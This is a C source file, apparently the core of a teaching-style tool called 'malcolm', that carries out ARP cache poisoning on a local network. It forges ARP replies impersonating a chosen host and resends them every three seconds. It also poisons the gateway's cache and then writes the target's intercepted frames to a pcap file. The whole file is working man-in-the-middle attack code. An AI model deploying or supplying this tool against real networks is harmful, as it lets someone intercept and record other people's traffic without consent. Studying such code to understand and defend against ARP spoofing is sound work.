#include "malcolm.h"

// INFO : Why just use one Global variable? -> Do cleanup resource in signal handler
struct mitm data;

bool convert_mac(const char *src_mac, unsigned char *dest_mac)
{
  int  i = -1;
  char cur;

  if (ft_strlen(src_mac) != 17)
    return (false);
  while (src_mac[++i] != '\0')
  {
    cur = src_mac[i];
    if (cur == ':' && (i + 1) % 3 == 0)
    {
      dest_mac++;
      continue;
    }
    else if ((cur >= '0' && cur <= '9') || (cur >= 'a' && cur <= 'f') || (cur >= 'A' && cur <= 'F'))
    {
      *dest_mac = *dest_mac << 4;
      if (cur >= '0' && cur <= '9')
        *dest_mac += cur - '0';
      else if (cur >= 'a' && cur <= 'f')
        *dest_mac += cur - 'a' + 10;
      else
        *dest_mac += cur - 'A' + 10;
    }
    else
      return (false);
  }
  return (true);
}

int check_protocol(const char *ip, struct in_addr *ipv4, struct in6_addr *ipv6)
{
  if (inet_pton(AF_INET, ip, ipv4) > 0)
    return IPV4; // IPv4
  else if (inet_pton(AF_INET6, ip, ipv6) > 0)
    return IPV6; // IPv6
  else
    ft_assert(0, "Invalid IP address: %s", ip);
  return -1;     // Unreachable, just to silence warnings
}

void args_check(char *argv[], struct mitm *data)
{
  const IP_TYPE source_protocol = check_protocol(argv[1], &data->source_ipv4, &data->source_ipv6);
  const IP_TYPE target_protocol = check_protocol(argv[3], &data->target_ipv4, &data->target_ipv6);

  ft_assert(convert_mac(argv[2], data->source_mac) == true, "%s : invalid mac address(%s)", argv[0], argv[2]);
  ft_assert(convert_mac(argv[4], data->target_mac) == true, "%s : invalid mac address(%s)", argv[0], argv[4]);
  ft_assert(source_protocol == target_protocol, "Source and Target protocols do not match");
  ft_assert(source_protocol == IPV4, "Protocol is not IPV4");
  data->ip_type = source_protocol;
  if (DEBUG)
  {
    print_mac("Sender Address : ", data->source_mac, "\n");
    print_mac("Target Address : ", data->target_mac, "\n");
    if (data->ip_type == IPV4)
    {
      print_ipv4("Sender IP : ", (unsigned char *)&data->source_ipv4, "\n");
      print_ipv4("Target IP : ", (unsigned char *)&data->target_ipv4, "\n");
    }
  }
}

void make_arp_packet(unsigned char *buffer)
{
  struct ethhdr     *cur_eth = (struct ethhdr *)buffer;
  struct arp_packet *cur_arp = (struct arp_packet *)(buffer + sizeof(struct ethhdr));

  ft_memcpy(cur_eth->h_dest, data.target_mac, sizeof(data.target_mac));
  ft_memcpy(cur_eth->h_source, data.source_mac, sizeof(data.source_mac));
  ft_memcpy(cur_arp->target_ip, &data.target_ipv4, sizeof(data.target_ipv4));
  ft_memcpy(cur_arp->target_mac, data.target_mac, sizeof(data.target_mac));
  ft_memcpy(cur_arp->sender_ip, &data.source_ipv4, sizeof(data.source_ipv4));
  ft_memcpy(cur_arp->sender_mac, data.source_mac, sizeof(data.source_mac));
  cur_arp->hdr.ar_hrd = htons(1);            // Ethernet (1)
  cur_arp->hdr.ar_pro = htons(ETHERTYPE_IP); // IPv4 (0x0800)
  cur_arp->hdr.ar_hln = 6;                   // MAC 주소 길이 (6 바이트)
  cur_arp->hdr.ar_pln = 4;                   // IPv4 주소 길이 (4 바이트)
  cur_arp->hdr.ar_op  = htons(ARPOP_REPLY);  // ARP 응답 (2)
}

void *send_fake_arp_reply(void *arg)
{
  struct sockaddr_ll dest_addr;
  struct thread_arg *t_arg = arg;

  ft_memset(&dest_addr, 0, sizeof(dest_addr));
  dest_addr.sll_family   = AF_PACKET;
  dest_addr.sll_protocol = htons(t_arg->protocol);
  dest_addr.sll_ifindex  = data.if_index;
  dest_addr.sll_halen    = ETH_ALEN;
  ft_memcpy(dest_addr.sll_addr, t_arg->mac, ETH_ALEN);
  while (true)
  {
    if (sendto(data.sockfd, t_arg->buffer, t_arg->buflen, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) <= 0)
    {
      perror("sendto failed");
      exit(EXIT_FAILURE);
    }
    if (DEBUG)
      printf("send okay!!\n");
    sleep(3);
  }
  if (t_arg)
  {
    if (t_arg->buffer)
      free(t_arg->buffer);
    free(t_arg);
  }
  return (NULL);
}

void send_reply_packet(unsigned char *buffer, int buflen, __be16 protocol)
{
  pthread_t          tid;
  struct thread_arg *arg;

  arg         = malloc(sizeof(struct thread_arg));
  arg->buffer = malloc(buflen);
  ft_memcpy(arg->buffer, buffer, buflen);
  ft_memcpy(arg->mac, data.target_mac, MAC_ADDR_LEN);
  arg->buflen   = buflen;
  arg->protocol = protocol;
  if (pthread_create(&tid, NULL, send_fake_arp_reply, (void *)arg) != 0)
  {
    perror("pthread_create failed");
    exit(EXIT_FAILURE);
  }
  if (pthread_detach(tid) != 0)
  {
    perror("pthread_detach failed");
    exit(EXIT_FAILURE);
  }
}

void check_packet(unsigned char *buffer, int buflen)
{
  struct ethhdr     *eth    = (struct ethhdr *)buffer;
  struct arp_packet *packet = (struct arp_packet *)(buffer + sizeof(struct ethhdr));

  if (ntohs(eth->h_proto) == ETH_P_ARP)
  {
    if (ft_memcmp(packet->sender_ip, &data.target_ipv4, sizeof(data.target_ipv4)) == 0 &&
        ft_memcmp(packet->sender_mac, data.target_mac, sizeof(data.target_mac)) == 0 &&
        ft_memcmp(packet->target_ip, &data.source_ipv4, sizeof(data.source_ipv4)) == 0)
    {
      if (DEBUG)
      {
        printf("prev_packet!!\n");
        print_arp_packet(buffer);
      }
      make_arp_packet(buffer);
      if (DEBUG)
      {
        printf("new_packet!!\n");
        print_arp_packet(buffer);
      }
      send_reply_packet(buffer, buflen, ETH_P_ARP);
      send_gateway_arp_request_packet(buffer, buflen);
    }
    else if (ft_memcmp(packet->sender_ip, &data.gw_ipv4, sizeof(data.gw_ipv4)) == 0)
    {
      ft_memcpy(data.gw_mac, packet->sender_mac, MAC_ADDR_LEN);
      send_gateway_spoofing_packet(buffer, buflen);
      data.spoofing     = true;
      data.pcap_file_fd = init_pcap_file("test.pcap");
    }
  }
}

void wait_arp_req()
{
  unsigned char buffer[IP_MAXPACKET] = { 0 };
  int           saddr_len, buflen;

  saddr_len = sizeof(data.saddr);
  while (true)
  {
    buflen = recvfrom(data.sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&data.saddr, (socklen_t *)&saddr_len);
    ft_assert(buflen >= 0, "error in reading recvfrom function");
    if (buflen < (int)sizeof(struct ethhdr))
    {
      fprintf(stderr, "Packet too small to contain Ethernet header\n");
      continue;
    }
    if (data.spoofing)
    {
      struct ethhdr *eth = (struct ethhdr *)buffer;

      if (ft_memcmp(eth->h_dest, data.target_mac, sizeof(data.target_mac)) == 0)
      {
        if (DEBUG)
        {
          print_mac("\t|Ether Sender Address	: ", eth->h_source, "\n");
          print_mac("\t|Ether Destination Address	: ", eth->h_dest, "\n");
          printf("\tEther_prot = %d\n", eth->h_proto);
        }
        save_packet_to_pcap(data.pcap_file_fd, buffer, buflen);
      }
    }
    else
      check_packet(buffer, buflen);
  }
}

void make_socket()
{
  data.sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  ft_assert(data.sockfd > 0, "error in socket!");
  if (setsockopt(data.sockfd, SOL_SOCKET, SO_BINDTODEVICE, data.if_name, ft_strlen(data.if_name)) < 0)
  {
    close(data.sockfd);
    perror("setsockopt(SO_BINDTODEVICE)");
    exit(EXIT_FAILURE);
  }
}

int main(int argc, char *argv[])
{
  ft_assert(argc == 5, "usage : %s source_ip source_mac target_ip target_mac", argv[0]);
  signal(SIGINT, cleanup_handler);
  args_check(argv, &data);
  select_interface();
  make_socket();
  wait_arp_req();
  return (EXIT_SUCCESS);
}
